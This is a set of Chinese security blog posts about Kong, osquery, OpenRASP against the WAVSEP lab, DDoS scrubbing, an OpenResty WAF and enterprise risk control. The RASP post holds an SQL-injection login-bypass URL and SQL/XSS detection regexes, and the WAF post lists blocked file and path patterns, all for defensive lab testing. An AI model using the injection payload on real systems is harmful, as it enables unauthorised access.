kong/3.4.2&#123;&quot;path_handling&quot;:&quot;v0&quot;,&quot;https_redirect_status_code&quot;:426,&quot;methods&quot;:null,&quot;sources&quot;:null,&quot;destinations&quot;:null,&quot;created_at&quot;:1699187621,&quot;protocols&quot;:[&quot;http&quot;,&quot;https&quot;],&quot;regex_priority&quot;:0,&quot;service&quot;:&#123;&quot;id&quot;:&quot;3bb09dda-db8a-4587-bd0f-9cd9607f636d&quot;&#125;,&quot;headers&quot;:null,&quot;tags&quot;:null,&quot;snis&quot;:null,&quot;preserve_host&quot;:false,&quot;paths&quot;:[&quot;/flasktest&quot;],&quot;id&quot;:&quot;ec442942-4857-44c1-8462-0aca41717cf2&quot;,&quot;strip_path&quot;:true,&quot;updated_at&quot;:1699187621,&quot;hosts&quot;:null,&quot;request_buffering&quot;:true,&quot;response_buffering&quot;:true,&quot;name&quot;:&quot;flask-route&quot;&#125; 现在我们访问，就可以了 12root@ubuntu2004:~/python-api# curl http://192.168.145.131:8000/flasktest/users/1&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125; 当然也可以在8002端口的web界面进行设置 复杂均衡 创建upstream 12curl -X POST http://localhost:8001/upstreams \\ --data name=example_upstream 创建负载均衡目标 1234curl -X POST http://localhost:8001/upstreams/example_upstream/targets \\ --data target=&apos;mockbin.org:80&apos;curl -X POST http://localhost:8001/upstreams/example_upstream/targets \\ --data target=&apos;httpbin.org:80&apos; Update the service 更新服务 12curl -X PATCH http://localhost:8001/services/example_service \\ --data host=&apos;example_upstream&apos; 验证 多次访问查看host的变化在mockbin和httpbin 之间更改就是配置成功了（注：mock路径是之前官方文档创建的路由） 1curl -s http://localhost:8000/mock/headers |grep -i -A1 &apos;&quot;host&quot;&apos; 插件插件那里有一些安全插件、流量控制的东西，这种东西自己搞可能就比较费劲了 当然还有代理缓存 参考https://github.com/Kong/kong https://docs.konghq.com/gateway/latest/get-started/services-and-routes/","categories":[],"tags":[{"name":"Kong","slug":"Kong","permalink":"https://www.giantbranch.cn/tags/Kong/"}]},{"title":"Ubuntu安装osquery试用","slug":"Ubuntu安装osquery试用","date":"2023-10-15T00:00:00.000Z","updated":"2023-11-06T00:56:22.343Z","comments":true,"path":"2023/10/15/Ubuntu安装osquery试用/","link":"","permalink":"https://www.giantbranch.cn/2023/10/15/Ubuntu安装osquery试用/","excerpt":"","text":"安装实验环境 Ubuntu 16.04 根据官网，debian系使用如下命令安装 1234sudo mkdir -p /etc/apt/keyringscurl -L https://pkg.osquery.io/deb/pubkey.gpg | sudo tee /etc/apt/keyrings/osquery.ascsudo add-apt-repository &apos;deb [arch=amd64 signed-by=/etc/apt/keyrings/osquery.asc] https://pkg.osquery.io/deb deb main&apos;sudo apt install osquery add-apt-repository出问题，报错invalid 手动添加到sources.list 12deb [arch=amd64] https://pkg.osquery.io/deb deb main apt update，报错NO_PUBKEY 1The following signatures couldn&apos;t be verified because the public key is not available: NO_PUBKEY 97A80C63C9D8B80B 我们添加以下：（97A80C63C9D8B80B根据上面报错修改） 1apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 97A80C63C9D8B80B 再执行 12apt updateapt install osquery 启动服务先手动启动看看有无报错 123456root@ubuntu:~# osqueryd W1018 07:21:11.436761 5261 init.cpp:760] Error reading config: config file does not exist: /etc/osquery/osquery.confI1018 07:21:11.436888 5261 eventfactory.cpp:156] Event publisher not enabled: BPFEventPublisher: Publisher disabled via configurationI1018 07:21:11.436990 5261 eventfactory.cpp:156] Event publisher not enabled: auditeventpublisher: Publisher disabled via configurationI1018 07:21:11.437004 5261 eventfactory.cpp:156] Event publisher not enabled: inotify: Publisher disabled via configurationI1018 07:21:11.437013 5261 eventfactory.cpp:156] Event publisher not enabled: syslog: Publisher disabled via configuration 发现少了conf文件 1cp /opt/osquery/share/osquery/osquery.example.conf /etc/osquery/osquery.conf 之后就可以启动啦 12345678910111213141516171819202122root@ubuntu:~# osqueryctl restartroot@ubuntu:~# osqueryctl status● osqueryd.service - The osquery Daemon Loaded: loaded (/usr/lib/systemd/system/osqueryd.service; disabled; vendor preset: enabled) Active: active (running) since Wed 2023-10-18 07:23:06 PDT; 3s ago Process: 5740 ExecStartPre=/bin/sh -c if [ -f $LOCAL_PIDFILE ]; then mv $LOCAL_PIDFILE $PIDFILE; fi (code=exited, status=0/SUCCESS) Process: 5729 ExecStartPre=/bin/sh -c if [ ! -f $FLAG_FILE ]; then touch $FLAG_FILE; fi (code=exited, status=0/SUCCESS) Main PID: 5743 (osqueryd) Tasks: 14 Memory: 14.9M CPU: 79ms CGroup: /system.slice/osqueryd.service ├─5743 /opt/osquery/bin/osqueryd --flagfile /etc/osquery/osquery.flags --config_path /etc/osquery/osquery.conf └─5750 /opt/osquery/bin/osqueryd Oct 18 07:23:06 ubuntu systemd[1]: Starting The osquery Daemon...Oct 18 07:23:06 ubuntu systemd[1]: Started The osquery Daemon.Oct 18 07:23:06 ubuntu osqueryd[5743]: osqueryd started [version=5.9.1]Oct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.520910 5750 eventfactory.cpp:156] Event publisher not enabled: BPFEventPublisher: Publisher disabled via configuratioOct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.571094 5750 eventfactory.cpp:156] Event publisher not enabled: auditeventpublisher: Publisher disabled via configuratOct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.571115 5750 eventfactory.cpp:156] Event publisher not enabled: inotify: Publisher disabled via configurationOct 18 07:23:06 ubuntu osqueryd[5743]: I1018 07:23:06.571126 5750 eventfactory.cpp:156] Event publisher not enabled: syslog: Publisher disabled via configuration 查询输入osqueryi即可开始查询 查询用户 1SELECT * from users; 查询shell登录的用户 1SELECT * FROM logged_in_users; 端口 12SELECT * FROM listening_ports;SELECT * FROM listening_ports WHERE port=3389; 内核模块 1select name from kernel_modules; 更多的表和结构可以查看 https://osquery.io/schema/5.9.1/ 页面可以选择osquery的版本","categories":[],"tags":[{"name":"osquery","slug":"osquery","permalink":"https://www.giantbranch.cn/tags/osquery/"}]},{"title":"应用实时防护（RASP）","slug":"应用实时防护（RASP）","date":"2023-10-11T00:00:00.000Z","updated":"2023-11-06T00:50:17.886Z","comments":true,"path":"2023/10/11/应用实时防护（RASP）/","link":"","permalink":"https://www.giantbranch.cn/2023/10/11/应用实时防护（RASP）/","excerpt":"","text":"应用实时防护（RASP）是一种现代的应用安全技术，它的原理是在应用程序运行时动态分析和监视应用程序的行为，以侦测和防止潜在的应用安全漏洞和攻击。RASP 技术通常被集成到应用程序代码中或应用程序服务器中，以实现实时的安全保护。以下是 RASP 技术的一般原理： 应用程序内嵌：RASP 技术通常以库或模块的形式嵌入到应用程序中，可以在应用程序的运行时启用和运行。这允许 RASP 技术深入了解应用程序的内部结构和行为。 实时监视：RASP 技术实时监视应用程序的执行。它跟踪应用程序的输入、输出、内部函数调用和数据流动等活动。 上下文感知：RASP 技术了解应用程序的上下文，包括用户、数据、环境和网络连接等。这有助于它更好地评估应用程序行为的合法性。 行为分析：RASP 技术对应用程序的行为进行分析，以检测不寻常的活动和潜在的攻击模式。它使用基于规则和机器学习等技术来进行分析。 攻击检测：RASP 技术识别和检测各种应用安全威胁，如 SQL 注入、跨站脚本（XSS）、跨站请求伪造（CSRF）等。 实时响应：当 RASP 技术检测到潜在的威胁时，它可以采取多种行动，包括拒绝请求、阻止攻击、记录事件、生成警报或采取其他安全响应措施。 自我保护：RASP 技术还可以自我保护，意味着它会尽力保护自身免受恶意攻击或尝试绕过它的行为。 安全策略配置：RASP 技术通常允许管理员配置安全策略，以适应不同的应用程序需求和威胁模式。这包括定义哪些行为是允许的，哪些是禁止的，以及如何响应各种威胁。 总的来说，RASP 技术通过深入了解应用程序的内部运行时行为，实时监视和分析应用程序活动，以检测和防止潜在的应用安全漏洞和攻击。这有助于应用程序更好地自我保护并提供实时的安全防护。但需要注意，RASP 技术通常不是独立的安全解决方案，而应与其他安全控制（如WAF、IDS/IPS等）一起使用，以建立更全面的安全防御体系。 测试环境搭建实验环境 Ubuntu 16.04tomcat 7 以java为例的，WAVSEP的漏洞靶场 1https://github.com/sectooladdict/wavsep/releases/tag/wavsep-v1.5-war 首先安装Tomcat环境、mysql 1apt install tomcat7 tomcat7-admin mysql-server mysql可能需要修改root密码 123mysql -u rootuse mysql;ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED WITH mysql_native_password BY &apos;新密码&apos;; 编辑tomcat配置文件 12root@ubuntu2004:/etc/tomcat7# vim tomcat-users.xml root@ubuntu2004:/etc/tomcat7# service tomcat9 restart 添加内容： 12&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;user username=&quot;tomcat&quot; password=&quot;XXXX&quot; roles=&quot;manager-gui&quot;/&gt; 创建数据库目录y 12mkdir /var/lib/tomcat7/dbchown -R tomcat7:tomcat7 /var/lib/tomcat7/db 登录后台，上传war包部署 1http://192.168.X.X:8080/manager/html 初始化 1http://localhost:8080/wavsep/wavsep-install/install.jsp OpenRASP安装先看看最新版的能不能行 下载 rasp-java.tar.gz 或者 rasp-java.zip 并解压缩。之后进入到解压后的目录中执行RaspInstall.jar 12345wget https://github.com/baidu/openrasp/releases/download/v1.3.7/rasp-java.zipunzip rasp-java.zipcd rasp-2022-01-28/# /usr/share/tomcat7是tomcat根目录，可以通过whereis tomcat7查看，一般是含有bin目录的java -jar RaspInstall.jar -install /usr/share/tomcat7 下面就是安装成功了 123456789101112131415161718root@ubuntu:~/rasp-2022-01-28# java -jar RaspInstall.jar -install /usr/share/tomcat7OpenRASP Installer for Java app servers - Copyright 2017-2021 Baidu Inc.For more details visit: https://rasp.baidu.com/doc/install/software.htmlDetected JDK version: 1.8.0_292Detected application server type: TomcatDuplicating &quot;rasp&quot; directory- /usr/share/tomcat7/raspMake &quot;rasp&quot; directory writableGenerating &quot;openrasp.yml&quot;- /usr/share/tomcat7/rasp/conf/openrasp.yml- Create /usr/share/tomcat7/rasp/conf/openrasp.ymlUpdating startup script- /usr/share/tomcat7/bin/catalina.shInstallation completed without errors.Please restart application server to take effect. 之后重启tomcat 12 下面目录是官方的插件，用的nodejs写的 12root@ubuntu:/usr/share/tomcat7/rasp/plugins# lsofficial.js 下面链接是官方规则可以检测的漏洞类型，但有些是仅IAST商业版支持 https://rasp.baidu.com/doc/usage/web.html 不过默认没有开启阻断，需要编辑official.js开启，之后重启tomcat7 12// 若 all_log 开启，表示为观察模式，会将所有的 block 都改为 log all_log: true, 访问以下sql注入 1http://192.168.XXX.XXX:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=textvalue%27%20or%207=7--%20&amp;password=textvalue2 就会跳转到百度的页面 开发插件官方有文档 https://rasp.baidu.com/doc/dev/example.html 就是下nodejs 12apt-get install -y nodejs npmnpm install -g openrasp 一个最小的SQL检测插件如下所示 123456789101112131415161718192021222324const plugin_version = &apos;2018-1000-1000&apos;const plugin_name = &apos;test-plugin&apos;&apos;use strict&apos;var plugin = new RASP(plugin_name)const clean = &#123; action: &apos;ignore&apos;, message: &apos;Looks fine to me&apos;, confidence: 0&#125;// BEGIN ALGORITHM CONFIG //var algorithmConfig = &#123;&#125;// END ALGORITHM CONFIG //plugin.register(&apos;sql&apos;, function (params, context) &#123; plugin.log(&apos;SQL query: &apos; + params.query) return clean&#125;)plugin.log(&apos;plugin-demo: plugin loaded&apos;) 主要就是调用 plugin.register 注册了SQL查询的检测函数，并将SQL语句打印到插件日志。 12params 为检查点提供的参数，如SQL语句、要读取的文件等等context 为请求信息，如请求参数，服务器信息等等 检测函数return clean，其实就是放行，clean的action是ignore 而除了注册sql之外，还可以注册检测什么，可以看下面的链接 https://rasp.baidu.com/doc/dev/data.html 下面我随便列出一点 读取目录： directory请求参数：request删除文件：deleteFile文件包含操作：include文件上传：fileUpload命令执行：command代码执行（目前支持 eval/function 两种函数）：eval响应检查：response 写好之后可以用上面装好的rasp库进行测试，可以参考这里：https://rasp.baidu.com/doc/dev/test/main.html 测试用例以 JSON 格式保存 12345678910111213141516[&#123; &quot;id&quot;: &quot;ssrf_userinput_intranet&quot;, &quot;name&quot;: &quot;ssrf&quot;, &quot;action&quot;: &quot;block&quot;, &quot;params&quot;: &#123; &quot;hostname&quot;: &quot;172.16.177.120&quot;, &quot;ip&quot;: [&quot;172.16.177.120&quot;], &quot;url&quot;: &quot;http://172.16.177.120/hello.action?redirect=123&quot; &#125;, &quot;context&quot;: &#123; &quot;parameter&quot;: &#123; &quot;url&quot;: [&quot;http://172.16.177.120/hello.action?redirect=123&quot;] &#125; &#125;, &quot;description&quot;: &quot;SSRF userinput match test&quot;&#125;] 其中，action 表示期望的结果，是拦截、日志还是放行；id 是测试用例编号。其他字段主要是对请求上下文的模拟。 运行单元测试，需要两个关键参数 测试用例目录，-d指定目录 检测插件路径，-p指定插件文件 1rasp check -d ./unitCases -p myplugin.js 实例： tests文件夹放的是sql.json，来源：https://raw.githubusercontent.com/baidu/openrasp/191aa2e5ed8b80f9a3580d3c64dccb0e425ef373/agent/java/engine/src/test/resources/pluginUnitTest/unitCases/sql.json 1234567891011121314151617181920212223242526272829303132333435363738394041# root@ubuntu:~# cat sql.js const plugin_version = &apos;2018-1000-1000&apos;const plugin_name = &apos;test-plugin&apos;&apos;use strict&apos;var plugin = new RASP(plugin_name)const clean = &#123; action: &apos;log&apos;, message: &apos;Looks fine to me&apos;, confidence: 0&#125;const attack = &#123; action: &apos;block&apos;, message: &apos;sql注入攻击，阻断&apos;, confidence: 0&#125;// BEGIN ALGORITHM CONFIG //var algorithmConfig = &#123;&#125;// END ALGORITHM CONFIG //plugin.register(&apos;sql&apos;, function (params, context) &#123; if(/(union.*select|sleep)/i.test(params.query)) return attack&#125;)plugin.log(&apos;plugin-demo: plugin loaded&apos;)root@ubuntu:~# rasp check -d ./tests/ -p ./sql.js OpenRASP plugin devtool - https://rasp.baidu.com[test-plugin] plugin-demo: plugin loaded ✓ sql.json Simple userinput match test: 3ms ✓ sql.json SQL injection with hex values: 1ms ✓ sql.json SQL injection with datetime methods: 0ms 3 passing (11ms) 默认的规则好像检测不到Get参数的反射型xss，我写两个简单的，不过就检测一个script，大家可以完善，不过调试的时候，好像querystring是有url编码的，这个需要注意，不然&lt;script是检测不到的 123456789101112131415161718192021222324252627282930313233343536373839const plugin_version = &apos;2023-1015-1520&apos;const plugin_name = &apos;xss-plugin&apos;&apos;use strict&apos;var plugin = new RASP(plugin_name)var xssRegex = /script/iconst clean = &#123; action: &apos;log&apos;, message: &apos;无风险&apos;, confidence: 0&#125;const attack = &#123; action: &apos;block&apos;, message: &apos;有攻击，阻断&apos;, confidence: 95 &#125;// BEGIN ALGORITHM CONFIG //var algorithmConfig = &#123;&#125;// END ALGORITHM CONFIG //plugin.register(&apos;request&apos;, function (params, context) &#123; var querystring = context.querystring var message = &quot;&quot;; plugin.log(querystring) if (xssRegex.test(querystring))&#123; message = &quot;XSS攻击：&quot; + querystring return attack &#125; if (! message.length) &#123; return clean; &#125; &#125;)plugin.log(&apos;xss-plugin plugin loaded&apos;) 参考《基于开源软件打造企业安全》","categories":[],"tags":[{"name":"RASP","slug":"RASP","permalink":"https://www.giantbranch.cn/tags/RASP/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"https://www.giantbranch.cn/tags/企业安全建设/"}]},{"title":"流量清洗与流量压制","slug":"流量清洗与流量压制","date":"2023-10-11T00:00:00.000Z","updated":"2023-11-06T00:50:18.394Z","comments":true,"path":"2023/10/11/流量清洗与流量压制/","link":"","permalink":"https://www.giantbranch.cn/2023/10/11/流量清洗与流量压制/","excerpt":"","text":"这两个都是DDos防护中的概念，看着很高大上，那么GPT会怎么说这两个东西嗯 流量清洗流量清洗是一种网络安全和数据管理技术，用于识别、过滤和处理网络流量中的异常、恶意或不良数据。这项技术通常由网络服务提供商、数据中心、云服务提供商和企业使用，以维护网络的安全性、性能和可用性。 实际上，流量清洗执行以下任务： 检测和过滤恶意流量：流量清洗系统能够检测和过滤包括病毒、恶意软件、僵尸网络攻击、分布式拒绝服务攻击（DDoS）和其他网络攻击形式的恶意流量。它们通过分析流量中的模式、行为和签名来实现此目标。 保护网络安全：流量清洗有助于防止网络威胁，确保关键网络资源和服务的安全。这对于保护网络免受未经授权的访问和攻击非常重要。 提高网络性能：流量清洗可以帮助过滤掉非必要或恶意的流量，从而减轻网络带宽压力，提高网络性能，确保合法流量能够正常传递。 维护服务可用性：通过阻止 DDoS 攻击和其他网络攻击，流量清洗有助于确保网络服务的可用性。这对于在线服务提供商、电子商务网站和其他依赖于持续在线性能的组织非常重要。 合规性和监控：流量清洗也用于监控网络活动，帮助组织遵守法规和监管要求。它提供了数据审计和记录功能，以便在需要时审查网络活动。 数据优化：一些流量清洗解决方案还可以帮助优化数据传输，减少数据冗余和传输时延，从而提高网络效率。 总结：就是不让一些恶意流量直接送到我们要防护的服务器，当然一般不能阻止攻击的流量 那么代码是怎么实现的呢 以下是一个伪代码示例，演示了如何基本实现流量清洗。请注意，这只是一个简化的示例，实际的流量清洗系统会更复杂和高级。 123456789101112131415161718192021222324252627282930313233343536# 伪代码示例 - 简单的流量清洗# 创建一个列表，用于存储已知的恶意 IP 地址malicious_ips = [\"192.168.1.100\", \"10.0.0.2\", ...]# 接收传入的网络流量数据包def receive_packet(packet): source_ip = packet.source_ip destination_ip = packet.destination_ip # 检查源 IP 是否在已知的恶意 IP 列表中 if source_ip in malicious_ips: log(\"恶意流量：拦截数据包从 \" + source_ip + \" 到 \" + destination_ip) drop_packet(packet) # 丢弃数据包 else: forward_packet(packet) # 正常转发数据包# 丢弃数据包def drop_packet(packet): # 丢弃数据包，不进行进一步处理 pass# 正常转发数据包def forward_packet(packet): # 将数据包发送到目标，可能会对数据包进行进一步处理 pass# 记录事件到日志def log(message): # 记录事件信息到日志文件 pass# 主循环 - 监听传入流量while True: packet = receive_packet_from_network() # 从网络接收数据包 receive_packet(packet) # 处理数据包 这个简单的伪代码示例演示了一个基本的流量清洗系统，它检查传入数据包的源 IP 地址，如果源 IP 在已知的恶意 IP 列表中，就会丢弃该数据包。否则，它会将数据包正常转发。这是一个非常简化的示例，实际的流量清洗系统会更加复杂，包括更多的安全策略和功能，以及对各种网络协议和数据类型的支持。 流量压制这个一般是运营商才能干，比如电信的云堤，直接在骨干网的设备对流量进行处理 根据中国电信安全官网描述： 流量压制是利用中国电信作为基础运营商对互联网“手术刀式”的流量调度能力，通过发布黑洞路由，丢弃来自网络特定方向所有去往该客户IP地址（段）的流量，快速应对超大规模攻击。","categories":[],"tags":[{"name":"ddos","slug":"ddos","permalink":"https://www.giantbranch.cn/tags/ddos/"}]},{"title":"自建WAF系统","slug":"自建WAF系统","date":"2023-10-04T00:00:00.000Z","updated":"2023-11-06T00:50:17.378Z","comments":true,"path":"2023/10/04/自建WAF系统/","link":"","permalink":"https://www.giantbranch.cn/2023/10/04/自建WAF系统/","excerpt":"","text":"实验环境 Ubuntu20.04openresty-1.21.4.2 OpenResty简介OpenResty 是一个基于 Nginx 的 Web 应用服务器，它将 Nginx 与一组强大的 Lua 模块集成在一起，提供了高性能、可扩展和灵活的 Web 开发环境。OpenResty 的目标是通过编写简洁的 Lua 代码来构建高性能的 Web 应用，而无需额外的服务器端脚本语言。 OpenResty 提供了丰富的 Lua 库和模块，可以与各种第三方服务和数据库进行交互，如 MySQL、Redis、Memcached 等，从而实现复杂的业务逻辑和数据处理。通过 Lua 脚本的编写，您可以在请求的不同阶段对请求进行处理、路由、验证、转发等操作，以及对响应进行过滤、修改等操作。 OpenResty 的优势主要有以下几点： 高性能：OpenResty 基于 Nginx，继承了其高性能、高并发处理能力和低资源消耗特点。同时，通过使用 Lua 进行自定义的请求处理和响应生成，可以进一步提高应用的性能。 可扩展：OpenResty 提供了丰富的 Lua 库和模块，可以轻松地扩展功能，从而满足不同业务场景的需求。借助这些扩展，您可以快速构建出符合自己业务需求的定制化 Web 服务器。 灵活性：OpenResty 提供了灵活的配置和编程方式，可以在全局层面和请求处理阶段进行高度定制。您可以根据需要对请求和响应进行精细控制，实现个性化的处理逻辑。 社区支持：OpenResty 拥有庞大的用户社区和开发者社区，提供了大量的资源、插件和示例代码，方便开发者学习和交流。 总之，OpenResty 是一个功能强大且易于使用的 Web 应用服务器，它通过集成 Nginx 和 Lua，提供了一种高性能、可扩展和灵活的方式来构建 Web 应用。无论是构建 API 服务、处理静态文件、实现反向代理还是构建微服务架构，OpenResty 都是一个值得考虑的选择。 OpenResty下载与编译安装依赖： 1apt update &amp;&amp; apt install libpcre3-dev libssl-dev perl make build-essential curl zlib1g-dev 下载 1wget https://openresty.org/download/openresty-1.21.4.2.tar.gz 解压安装编译 12345678tar -xvf openresty-VERSION.tar.gzcd openresty-VERSION/./configure -j2make -j2sudo make install# better also add the following line to your ~/.bashrc or ~/.bash_profile file.export PATH=/usr/local/openresty/bin:/usr/local/openresty/nginx/sbin:$PATH 或者假如是Ubuntu可以直接根据官方文档，添加仓库，直接apt安装 安装unixhot waf下载 1git clone https://github.com/unixhot/waf.git 将里面waf文件夹复制到Nginx配置文件目录 12cp -rf waf /usr/local/openresty/nginx/conf/ln -s /usr/local/openresty/lualib/resty/ /usr/local/openresty/nginx/conf/waf/resty 修改nginx配置文件nginx.conf 12345# WAF lua_shared_dict limit 50m; lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;; init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;; access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;; 这段 nginx 配置主要是实现使用 OpenResty 的 WAF (Web Application Firewall) 应用。具体含义如下： lua_shared_dict limit 50m;：定义了名为 limit 的共享字典，大小为 50MB，这个共享字典是用来存储限流、计数等信息的。 lua_package_path “/usr/local/openresty/nginx/conf/waf/?.lua”;：定义了 Lua 脚本的搜索路径，这里是在 /usr/local/openresty/nginx/conf/waf/ 目录下寻找 Lua 文件。 init_by_lua_file “/usr/local/openresty/nginx/conf/waf/init.lua”;：在 Nginx 启动时执行一次 init.lua 脚本，主要完成 WAF 初始化操作。 access_by_lua_file “/usr/local/openresty/nginx/conf/waf/access.lua”;：在处理请求时，先执行 access.lua 脚本，主要完成 WAF 的访问控制功能。 Nginx反向代理Nginx+Lua WAF很重要的一个基础功能，即反向代理功能 一般通过Location里面添加 proxy_pass来实现 这里我本地实验，就不用反向代理了 1proxy_pass https://www.XXX.com/; 基于Nginx+Lua得WAFWAF得配置在config.lua中 从access.lua可以看出检测的顺序 123456789101112131415161718require &apos;init&apos;function waf_main() if white_ip_check() then elseif black_ip_check() then elseif user_agent_attack_check() then elseif cc_attack_check() then elseif cookie_attack_check() then elseif white_url_check() then elseif url_attack_check() then elseif url_args_attack_check() then --elseif post_attack_check() then else return endendwaf_main() 规则在rule-config目录 123root@vm:/usr/local/openresty/nginx/conf/waf# ls rule-config/args.rule cookie.rule url.rule whiteip.ruleblackip.rule post.rule useragent.rule whiteurl.rule 查看url.rule得内容 1234567root@vm:/usr/local/openresty/nginx/conf/waf/rule-config# cat url.rule \\.(htaccess|bash_history)\\.(bak|inc|old|mdb|sql|backup|java|class|tgz|gz|tar|zip)$(phpmyadmin|jmx-console|admin-console|jmxinvokerservlet)java\\.lang\\.svn\\//(attachments|upimg|images|css|uploadfiles|html|uploads|templets|static|template|data|inc|forumdata|upload|includes|cache|avatar)/(\\\\w+).(php|jsp) 可以看到一条规则一行 都是一些敏感文件，敏感后缀，敏感目录等 测试输入openresty启动nginx（其实是nginx得软连接） 12root@vm:~# ll /usr/local/openresty/bin/openresty lrwxrwxrwx 1 root root 37 Oct 5 01:57 /usr/local/openresty/bin/openresty -&gt; /usr/local/openresty/nginx/sbin/nginx* 在浏览器输入zip后缀","categories":[],"tags":[{"name":"企业安全建设,waf","slug":"企业安全建设-waf","permalink":"https://www.giantbranch.cn/tags/企业安全建设-waf/"}]},{"title":"《互联网企业安全高级指南》之实践篇","slug":"《互联网企业安全高级指南》之实践篇","date":"2023-09-22T00:00:00.000Z","updated":"2023-11-08T07:54:23.741Z","comments":true,"path":"2023/09/22/《互联网企业安全高级指南》之实践篇/","link":"","permalink":"https://www.giantbranch.cn/2023/09/22/《互联网企业安全高级指南》之实践篇/","excerpt":"","text":"业务安全与风控对抗原则 相对的风控而非绝对的防黑 增加黑产的成本而非阻断他们的行为——假如投入成本超过损益点，那就没必要薅你羊毛或者攻击你 永远的情报——深入敌后，爬虫与QQ群 方法比技术更重要——技术对抗是无止境的，改变战场规则可能起到一招退敌效果 数据比算法更重要 勤能补拙——不断改变业务逻辑，不断升级使对手疲于奔命 忽略性能、用户体验和成本的风控没有意义 纵深防御——由机器规则处理最原始数据，逐步筛选过滤，最后人工审核 杀鸡给猴看——只要条件允许，用法律武器断掉主力，用风控手段扫尾 人民的战争——教育用户安全意识，鼓励全民情报 社工库——敌人有的，我也要有 账户安全注册对抗垃圾注册: 图片验证码 邮件验证码 短信验证码 语音验证码 电话语音验证码 登录问题包括：撞库、暴力破解、盗号登录、非常用设备登录、黑产小号和僵尸号登录等 风控服务依赖于很多数据：设备指纹、IP信誉库、黑产手机号、社工库、用户画像等。 密保/密码找回应提供多种密码保护手段：密保问题、安全中心手机版等 密码找回/重置不能存在逻辑漏洞或者过度的信息披露 提供异地登录提醒、异常登录提醒、破解账户提醒。 找回密码需要人机识别，方式批量找回 多因素认证在密码找回、重置、安装证书等重要操作需要启用 多设备都能保证同平台不能串号：PC和APP可以同时登录，但是两个PC不能登录同一个账户 假如登录就要踢下线 账户共享体系单点登录（Single Sign-On，简称SSO）是一种身份验证和授权机制，允许用户使用一组凭据（如用户名和密码）在多个应用程序或系统中进行身份验证，而无需为每个应用程序单独登录。 常见的SSO实现协议包括SAML（Security Assertion Markup Language）、OAuth（Open Authorization）和OpenID Connect等，这些协议定义了身份认证和授权的交互方式和流程。 但是凭借一个token就登录所有应用不是一个好设计，一旦xss盗取了，相当于全线溃防。一般对高安全域的，比如个人认证信息、支付类等重要的，引入第二层认证的secure token，只有一个token登录不了重要应用，需要两个token才可以。 电商类恶意下单拍下商品但不付款：高峰时段下单使用验证码 黄牛抢单风控：小号、僵尸号与正常用户的区别、登录的途径、登录地域、登录设备指纹、收获地址等里啊分类标记 也可以临时更换业务逻辑使抢单程序失效；在抢购过程中使用验证码做人机识别 刷优惠券和奖励根据大数据标记用户恶意灰度。给优质账户高额回馈，低信誉小额优惠。 反价格爬虫主要是竞争对手比价 爬虫特征：爬虫所在的IP段、不是正常的浏览器、可能不会解析JavaScript、缺少正常的浏览器客户端行为和通信 （跟DDos中的CC攻击人机识别有点类似） 反欺诈根据账户注册信息的真实性、登录设备的真实性、绑卡异常、账户异常，结合自有或第三方历史征信数据综合判断欺诈的可能性。 可能包括： 虚假商品销售、钓鱼网站和假冒店铺、虚假评价和刷单、虚假退货和售后服务、虚假折扣和促销手段、虚假投诉和纠纷 信息泄露来源：撞库、用户信息过度展现和披露、开放平台API滥用、供应链上下游信息泄露、内鬼兜售内部数据 成熟的大公司英国建立执行隐私保护的标准，对数据分类分级，加密脱敏。 交易风控依赖于以下几个方面： 账户安全 客户端安全：反钓鱼、反木马 认证机制：证书PKI（Public Key Infrastructure，公钥基础设施，是一种安全框架，用于管理和分发公钥证书以及支持加密通信和身份验证。）、令牌、多因素认证 风险评估：账户历史行为、历史征信数据、交易和账户异常、漏洞模型筛选：机器规则+人工审核 交易风控在传统安全（包括认证、账户、KMS、PKI、客户端完整性等）的基础上还需要由3大组成部分： 用户数据、交易数据 来自传统金融行业的风险管理 基于大数据的风控平台 交易风控团队需要两拨人：一来自传统金融行业，另一个来自互联网 广告类点击欺诈，数据作假，所以目前都是按广告效果，实际订单效果收费 CPM（Cost per Mille）： CPM指的是每千次展示成本。CPC（Cost per Click）： CPC指的是每次点击成本。 这两个都不行了，需要CPA（Cost per Action）： CPA指的是每个行动的成本。 广告联盟优势跟黑产一样，假装正常用户注册登录充值，小量消费，只要消费低于广告费它就是赚的。 需要依靠账号标签以及对用户行为模式的数据分析来获取 媒体类主要是黄赌毒、舆情安全 基础手段：敏感字过滤、举报功能、人工审核高级手段：抓取样本，用机器学习的方法做特征识别 网游类除了盗号盗充，主要问题就是反外挂、私服、打金工作室 “打金工作室”通常指的是一种非法或违反游戏规则的活动，主要是指在网游中以非正当手段获取虚拟货币、装备或其他游戏资源，并出售给玩家获取利润的组织或个人。 这些打金工作室往往使用外挂、作弊程序、恶意刷钱等手段来获取游戏内的财产，这种行为严重破坏了游戏的平衡性和公平性。 保护手段： 客户端：代码混淆、加密加壳、反调试 网络封包：对抗重放型攻击 服务端校验：大部分逻辑校验放服务端，校验时钟同步 人机识别 产品内容设计：物品与账户绑定 运营数据监控 私服：供应链管理，研发到运营的交付，研发的信息安全管理，运营平台防黑、研发团队集体跳槽的知识产权保护，主创人员敏感异动预警，竞业协议，保密协议等 最后还需各种情报的收集 云计算这站在云计算平台厂商角度看， CaaS（Crime as a service），出了黄赌毒、很多虚拟机实例被植入木马变成“养鸡场”，僵尸网络的集中地，频繁DDos其他IDC或者用于暴力破解密码 云计算平台厂商可以做的是基于网络的异常流量分析 大规模纵深防御体系的设计与实现设计方案的考虑防护手段： 安全域划分 /VPC /VLAN隔离 OS加固：比如目录的wrx权限，cgroup+namespace+chroot 最前端的抗DDos防护 4层防火墙的过滤 检测手段变现为一个个相对独立的产品形态，而防护则更多以零散的手段分布各处 